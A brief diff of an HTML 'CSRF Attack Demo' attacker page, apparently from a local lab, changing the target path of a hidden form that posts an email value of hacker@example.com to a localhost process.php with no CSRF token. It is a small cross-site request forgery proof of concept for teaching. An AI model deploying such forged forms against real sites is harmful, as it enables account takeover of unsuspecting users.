@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>CSRF Attack Demo</title></head>
 <body>
 <h1>Attacker Page</h1>
-<form action="http://localhost/project/process.php" method="POST" id="attackForm">
+<form action="http://localhost/csrf_demo/process.php" method="POST" id="attackForm">
     <input type="hidden" name="email" value="hacker@example.com">
     <!-- ไม่มี csrf_token -->
 </form>
